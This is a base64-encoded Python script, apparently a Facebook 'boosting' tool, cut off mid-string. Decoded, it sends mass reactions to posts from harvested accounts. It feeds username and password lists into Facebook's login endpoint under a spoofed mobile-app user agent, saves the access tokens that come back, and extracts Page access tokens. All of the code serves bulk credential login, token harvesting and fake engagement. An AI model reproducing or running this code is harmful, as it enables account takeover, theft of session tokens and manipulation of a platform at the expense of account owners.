AgICByZWFjdGlvbl9pZHMgPSB7CiAgICAgICAgICAgICcxJzogJzE2MzU4NTU0ODY2NjY5OTknLAogICAgICAgICAgICAnMic6ICcxNjc4NTI0OTMyNDM0MTAyJywKICAgICAgICAgICAgJzMnOiAnMTE1OTQwNjU4NzY0OTYzJywKICAgICAgICAgICAgJzQnOiAnNDc4NTQ3MzE1NjUwMTQ0JywKICAgICAgICAgICAgJzUnOiAnNjEzNTU3NDIyNTI3ODU4JywKICAgICAgICAgICAgJzYnOiAnOTA4NTYzNDU5MjM2NDY2JywKICAgICAgICAgICAgJzcnOiAnNDQ0ODEzMzQyMzkyMTM3JywKICAgICAgICAgICAgJzgnOiAnMCcKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlYWN0aW9uX2lkcy5nZXQocmVjKQoKICAgIGRlZiBsaW5rdHJhZGlvKHBvc3RfbGluazogc3RyKSAtPiBzdHI6CiAgICAgICAgcGF0dGVybnMgPSBbCiAgICAgICAgICAgIHInL3Bvc3RzLyhcdyspJywKICAgICAgICAgICAgcicvdmlkZW9zLyhcdyspJywKICAgICAgICAgICAgcicvZ3JvdXBzLyhcZCspL3Blcm1hbGluay8oXGQrKScsCiAgICAgICAgICAgIHInL3JlZWxzLyhcdyspJywKICAgICAgICAgICAgcicvbGl2ZS8oXHcrKScsCiAgICAgICAgICAgIHInL3Bob3Rvcy8oXHcrKScsCiAgICAgICAgICAgIHInL3Blcm1hbGluay8oXHcrKScsCiAgICAgICAgICAgIHInc3RvcnlfZmJpZD0oXHcrKScsCiAgICAgICAgICAgIHInZmJpZD0oXGQrKScKICAgICAgICBdICAgICAgICAKICAgICAgICBmb3IgcGF0dGVybiBpbiBwYXR0ZXJuczoKICAgICAgICAgICAgbWF0Y2ggPSByZS5zZWFyY2gocGF0dGVybiwgcG9zdF9saW5rKQogICAgICAgICAgICBpZiBtYXRjaDoKICAgICAgICAgICAgICAgIGlmIHBhdHRlcm4gPT0gcicvZ3JvdXBzLyhcZCspL3Blcm1hbGluay8oXGQrKSc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoLmdyb3VwKDIpCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2guZ3JvdXAoMSkKICAgICAgICAKICAgICAgICBwcmludChmIntyZWR9SU5WQUxJRCBQT1NUIExJTksgT1IgRk9STUFUIikKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGRlZiBnZXRfaWRzX3Rva2VucyhmaWxlX3BhdGgpOgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgcmV0dXJuIFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZV0KCiAgICBkZWYgY2hvb3NlX3R5cGUoKToKICAgICAgICBjbGVhcigpCiAgICAgICAgbG9nbygpCiAgICAgICAgcHJpbnQoIlsxXSBBIFJFR1VMQVIgUE9TVCIpCiAgICAgICAgcHJpbnQoIlsyXSBBIEdST1VQIFBPU1QiKQogICAgICAgIHByaW50KCJbM10gQSBWSURFTyBQT1NUIikKICAgICAgICBwcmludCgiWzRdIEEgUEhPVE8gUE9TVCIpCiAgICAgICAgbGluZXgoKQogICAgICAgIGNob2ljZSA9IGlucHV0KCdceDFiWzE7MzJtQ0hPT1NFIDogJykKICAgICAgICByZXR1cm4gY2hvaWNlCiAgICBhY3Rvcl9pZHMgPSBnZXRfaWRzX3Rva2VucygnL3NkY2FyZC9FUlJPUi1CT09TVElORy90b2twaWQudHh0JykKICAgIHRva2VucyA9IGdldF9pZHNfdG9rZW5zKCcvc2RjYXJkL0VSUk9SLUJPT1NUSU5HL3Rva3AudHh0JykgICAgCiAgICBjaG9pY2UgPSBjaG9vc2VfdHlwZSgpICAgIAogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBsaW5leCgpCiAgICAgICAgcG9zdF9saW5rID0gaW5wdXQoJ0VOVEVSIFRIRSBGQUNFQk9PSyBQT1NUIExJTks6ICcpCiAgICAgICAgcG9zdF9pZCA9IGxpbmt0cmFkaW8ocG9zdF9saW5rKQogICAgZWxpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGxpbmV4KCkKICAgICAgICBwb3N0X2xpbmsgPSBpbnB1dCgnRU5URVIgVEhFIEZBQ0VCT09LIEdST1VQIFBPU1QgTElOSzogJykKICAgICAgICBwb3N0X2lkID0gbGlua3RyYWRpbyhwb3N0X2xpbmspCiAgICBlbGlmIGNob2ljZSA9PSAnMyc6CiAgICAgICAgbGluZXgoKQogICAgICAgIHBvc3RfbGluayA9IGlucHV0KCdFTlRFUiBUSEUgRkFDRUJPT0sgVklERU8gUE9TVCBMSU5LOiAnKQogICAgICAgIHBvc3RfaWQgPSBsaW5rdHJhZGlvKHBvc3RfbGluaykKICAgIGVsaWYgY2hvaWNlID09ICc0JzoKICAgICAgICBsaW5leCgpCiAgICAgICAgcG9zdF9saW5rID0gaW5wdXQoJ0VOVEVSIFRIRSBGQUNFQk9PSyBQSE9UTyBQT1NUIExJTks6ICcpCiAgICAgICAgcG9zdF9pZCA9IGxpbmt0cmFkaW8ocG9zdF9saW5rKQogICAgZWxzZToKICAgICAgICBwcmludChmJycne3JlZH1JTlZBTElEIENIT0lDRS4nJycpCiAgICAgICAgcmV0dXJuCiAgICBpZiBub3QgcG9zdF9pZDoKICAgICAgICByZXR1cm4KICAgIHJlYWN0ID0gY2hvb3NlX3JlYWN0aW9uKCkKICAgIGxpbmV4KCkKICAgIGlmIHJlYWN0OgogICAgICAgIGdsb2JhbCByZWFjdF9jb3VudAogICAgICAgIHJlYWN0X2NvdW50ID0gaW50KGlucHV0KCJIT1cgTUFOWSBSRUFDVElPTlMgRE8gWU9VIFdBTlQgVE8gU0VORD8gIikpCiAgICAgICAgbGluZXgoKQogICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTUpIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gWwogICAgICAgICAgICAgICAgZXhlY3V0b3Iuc3VibWl0KHByb2Nlc3NfcmVhY3Rpb24sIGFjdG9yX2lkLCB0b2tlbiwgcG9zdF9pZCwgcmVhY3QpCiAgICAgICAgICAgICAgICBmb3IgYWN0b3JfaWQsIHRva2VuIGluIHppcChhY3Rvcl9pZHMsIHRva2VucykKICAgICAgICAgICAgXVs6cmVhY3RfY291bnRdCiAgICAgICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZXMpOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59e3N1Y2Nlc3NmdWxfcmVhY3Rpb25zfSBTVUNDRVNTRlVMIFJFQUNUSU9OUyBTRU5UISBZT1UnUkUgQVdFU09NRSF7d2hpdGV9IikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7cmVkfUlOVkFMSUQgUkVBQ1RJT04gT1BUSU9OLnt3aGl0ZX0nKQogICAgICAgIAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzIGFzIHRocmVhZAppbXBvcnQgb3MKaW1wb3J0IHN0cmluZwoKIyBSYW5kb20gRkIgdmVyc2lvbiBnZW5lcmF0aW9uCmZiYXYgPSBmJ3tyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0nCmZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQpmYnJ2ID0gJzAnCnJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCmFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgojIFVzZXIgYWdlbnQgc3RyaW5nCnVhX2JncmFwaCA9ICdbRkJBTi9GQjRBO0ZCQVYvJyArIHN0cihyYW5kb20ucmFuZGludCg0OSwgNjYpKSArICcuMC4wLicgKyBzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgNDkpKSArIHN0cihyYW5kb20ucmFuZGludCgxMSwgOTkpKSArICc7RkJCVi8nICsgc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpICsgJzsnICsgJ1tGQkFOL0ZCNEE7RkJBVi8nICsgZmJhdiArICc7RkJCVi8nICsgZmJidiArICc7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjEwN307RkJMQy9mcl9GUjtGQlJWLycgKyBmYnJ2ICsgJztGQkNSL09vcmVkb28gVE47RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTUFSLUxYMU07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwoKZGVmIGJncmFwaCh1aWQsIHB3LCBwYXRoX2ZpbGUsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdWlkcyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICAKICAgICAgICBpZiB1aWQgaW4gZXhpc3RpbmdfdWlkczoKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9W0lORk9dIHtyZWR9QUNDT1VOVCAtLT4ge3doaXRlfXt1aWR9IHtyZWR9YWxyZWFkeSBleGlzdHMuIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkuanNvbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcmVzcG9uc2U6CiAgICAgICAgICAgIHRva2VuID0gcmVzcG9uc2VbJ2FjY2Vzc190b2tlbiddCgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aF9maWxlLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie3VpZH18e3Rva2VufVxuIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMybVtTVUNDRVNTXVwwMzNbMG06IEV4dHJhY3RlZCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMxbVtGQUlMRURdXDAzM1swbTogVE8gRVhUUkFDVCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszMW1bRVJST1JdXDAzM1swbSBFcnJvciBleHRyYWN0aW5nIGFjY291bnQ6IHt1aWR9LiBSZWFzb246IHtzdHIoZSl9XDAzM1swbVxuIikKCgpkZWYgcHJveihhY2NvdW50c19maWxlLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKToKICAgICIiIlByb2Nlc3MgdGhlIGFjY291bnRzIGFuZCBleHRyYWN0IHRva2VucyBjb25jdXJyZW50bHkuIiIiCiAgICBzdWNjZXNzX2NvdW50ID0gW10KCiAgICAjIExvYWQgZXhpc3RpbmcgdWlkcyBmcm9tIHRoZSBvdXRwdXQgZmlsZSB0byBhdm9pZCBkdXBsaWNhdGVzCiAgICBleGlzdGluZ191aWRzID0gc2V0KCkKICAgIGlmIG9zLnBhdGguZXhpc3RzKHRva2VuX291dHB1dF9wYXRoKToKICAgICAgICB3aXRoIG9wZW4odG9rZW5fb3V0cHV0X3BhdGgsICdyJykgYXMgZjoKICAgICAgICAgICAgZXhpc3RpbmdfdWlkcyA9IHtsaW5lLnNwbGl0KCd8JylbMF0gZm9yIGxpbmUgaW4gZi5yZWFkbGluZXMoKX0KCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGgsIHVpZCwgcHcsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3VpZHMpCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVpZCwgcHcgaW4gW2FjY291bnQuc3BsaXQoJ3wnKSBmb3IgYWNjb3VudCBpbiBhY2NvdW50c11dCgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGZ1dHVyZXM6CiAgICAgICAgICAgICAgICBmdXR1cmUucmVzdWx0KCkKCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgXDAzM1sxOzM0bVtTVUNDRVNTXVwwMzNbMG06IHtsZW4oc3VjY2Vzc19jb3VudCl9IHtleHRyYWN0X3R5cGV9KHMpIHN1Y2Nlc3NmdWxseSBleHRyYWN0ZWQuIikKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIkZpbGUgbm90IGZvdW5kOiB7YWNjb3VudHNfZmlsZX0iKQogICAgICAgIHJldHVybgoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcyBhcyB0aHJlYWQKaW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKCmZiYXYgPSBmJycne3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfScnJwpmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKZmJydiA9ICcwJwpyYW5kb21fc2VlZCA9IHJhbmRvbS5SYW5kb20oKQphZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQp1YV9iZ3JhcGggPSAnW0ZCQU4vRkI0QTtGQkFWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDY2KSkgKyAnLjAuMC4nICsgc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDQ5KSkgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTEsIDk5KSkgKyAnO0ZCQlYvJyArIHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKSArICc7JyArICdbRkJBTi9GQjRBO0ZCQVYvJyArIGZiYXYgKyAnO0ZCQlYvJyArIGZiYnYgKyAnO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMDd9O0ZCTEMvZnJfRlI7RkJSVi8nICsgZmJydiArICc7RkJDUi9Pb3JlZG9vIFROO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL01BUi1MWDFNO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKCmRlZiBsb2FkX2V4aXN0aW5nX3Rva2VucyhwYXRoX2ZpbGUpOgogICAgIiIiTG9hZCBleGlzdGluZyBhY2NvdW50cyBvciBwYWdlcyBmcm9tIHRoZSBvdXRwdXQgZmlsZS4iIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGhfZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4ge2xpbmUuc3BsaXQoJ3wnKVswXSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpfSAgIyBTZXQgb2YgZXhpc3RpbmcgdWlkcyBvciBwYWdlIGlkcwogICAgcmV0dXJuIHNldCgpCgpkZWYgYmdyYXBoX3BhZ2UodWlkLCBwdywgcGF0aF9maWxlLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3Rva2Vucyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KICAgIAogICAgaWYgdWlkIGluIGV4aXN0aW5nX3Rva2VuczoKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7d2hpdGV9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtyZWR9e3VpZH0ge2dyZWVufUFMUkVBRFkgRVhJU1RTIikKICAgICAgICByZXR1cm4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIAogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICB0b2tlbiA9IHJlc3BvbnNlWydhY2Nlc3NfdG9rZW4nXQoKICAgICAgICAgICAgIyBFeHRyYWN0IEZhY2Vib29rIFBhZ2VzIGFzc29jaWF0ZWQgd2l0aCB0aGUgYWNjb3VudCB0b2tlbgogICAgICAgICAgICBwYWdlcyA9IGV4dHJhY3RfZmJfcGFnZXModG9rZW4pCiAgICAgICAgICAgIGlmIHBhZ2VzOgogICAgICAgICAgICAgICAgZm9yIHBhZ2UgaW4gcGFnZXM6CiAgICAgICAgICAgICAgICAgICAgcGFnZV9pZCA9IHBhZ2VbJ2lkJ10KICAgICAgICAgICAgICAgICAgICBpZiBwYWdlX2lkIG5vdCBpbiBleGlzdGluZ190b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoX2ZpbGUsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7cGFnZV9pZH18e3BhZ2VbJ2FjY2Vzc1Rva2VuJ119XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSAg4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59UGFnZSBJRDoge3JlZH17cGFnZV9pZH0ge3llbGxvd31FWFRSQUNURUQgU1VDQ0VTU0ZVTExZIikKICAgICAgICAgICAgICAgICAgICAgICAgZXhpc3RpbmdfdG9rZW5zLmFkZChwYWdlX2lkKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfUlEOiAge3BhZ2VfaWR9IOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufUFMUkVBRFkgRVhJU1RTICEgIikKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSDilIDilIDilIDilIDilIA+IHtyZWR9RE9FU04nVCBIQVZFIFBBR0VTICEiKQogICAgICAgICAgICAKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie3doaXRlfXt1aWR9ICDilIDilIDilIDilIDilIA+IHtyZWR9RkFJTEVEIFRPIEVYVFJBQ1QgISAiKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltFUlJPUl0gRXJyb3IgZXh0cmFjdGluZyBhY2NvdW50OiB7dWlkfS4gUmVhc29uOiB7c3RyKGUpfSIpCgpkZWYgZXh0cmFjdF9mYl9wYWdlcyh0b2tlbik6CiAgICB1cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE4LjAvbWUvYWNjb3VudHMnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3Rva2VufScKICAgIH0KICAgIAogICAgcGFnZXNfZGF0YSA9IFtdCiAgICAKICAgIHdoaWxlIHVybDoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDA6CiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtyZXNwb25zZS50ZXh0fScpCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGZvciBwYWdlIGluIGRhdGEuZ2V0KCdkYXRhJywgW10pOgogICAgICAgICAgICBwYWdlc19kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAnaWQnOiBwYWdlLmdldCgnaWQnKSwKICAgICAgICAgICAgICAgICdhY2Nlc3NUb2tlbic6IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgIHVybCA9IGRhdGEuZ2V0KCdwYWdpbmcnLCB7fSkuZ2V0KCduZXh0JykgICMgVXBkYXRlIHRoZSBVUkwgZm9yIHRoZSBuZXh0IHJlcXVlc3QKCiAgICByZXR1cm4gcGFnZXNfZGF0YQoKZGVmIHByb3pjKGFjY291bnRzX2ZpbGUsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUpOgogICAgc3VjY2Vzc19jb3VudCA9IFtdCiAgICBleGlzdGluZ190b2tlbnMgPSBsb2FkX2V4aXN0aW5nX3Rva2Vucyh0b2tlbl9vdXRwdXRfcGF0aCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNj